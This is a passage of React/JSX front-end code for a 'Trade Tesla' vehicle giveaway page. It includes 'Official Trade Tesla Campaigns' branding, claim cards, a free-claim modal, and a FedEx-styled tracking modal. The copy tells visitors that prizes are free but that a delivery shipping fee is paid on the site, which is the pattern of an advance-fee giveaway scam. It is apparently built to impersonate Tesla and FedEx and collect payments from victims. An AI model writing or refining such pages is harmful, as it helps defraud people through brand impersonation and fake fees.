                <span className="font-mono text-foreground underline underline-offset-4">{activeClaim.trackingNumber}</span>
              </p>
            </div>
            <button
              type="button"
              onClick={() =>
                triggerLoader({
                  label: "FEDEX TRACKING",
                  durationMs: 360,
                  onComplete: () => setShowFedExModal(true),
                })
              }
              className="h-10 rounded-[4px] bg-foreground px-5 text-xs font-medium text-background hover:opacity-90 transition-opacity self-start md:self-auto"
            >
              Track with FedEx Delivery →
            </button>
          </div>
        )}

        <div className="border-b border-border pb-8 mb-10">
          <span className="text-[11px] font-semibold uppercase tracking-[0.22em] text-muted-foreground">
            Official Trade Tesla Campaigns
          </span>
          <h1 className="font-display mt-2 text-3xl font-semibold tracking-tight sm:text-5xl">
            Vehicle Giveaways &amp; Free Claims
          </h1>
          <p className="mt-3 max-w-2xl text-sm text-muted-foreground leading-relaxed">
            Every promotional giveaway prize on Trade Tesla is free to enter ($0). Enclosed carrier
            delivery shipping (${GIVEAWAY_SHIPPING_FEE}) is paid or deducted on the website when you
            confirm your delivery destination.
          </p>
        </div>

        <div
          className={
            giveaways.length <= 2
              ? "grid grid-cols-1 md:grid-cols-2 gap-6"
              : "grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6"
          }
        >
          {giveaways.map((g) => (
            <GiveawayCard
              key={g.id}
              g={g}
              onEnter={(item) =>
                triggerLoader({
                  label: "DELIVERY PORTAL",
                  durationMs: 360,
                  onComplete: () => setActiveGiveaway(item),
                })
              }
            />
          ))}
        </div>
      </div>

      {activeGiveaway && (
        <FreeClaimModal
          giveaway={activeGiveaway}
          onClose={() => setActiveGiveaway(null)}
          onClaimSubmitted={handleClaimSubmitted}
        />
      )}

      {showFedExModal && activeClaim && (
        <FedExDeliveryModal claim={activeClaim} onClose={() => setShowFedExModal(false)} />
      )}
    </section>
  );
}
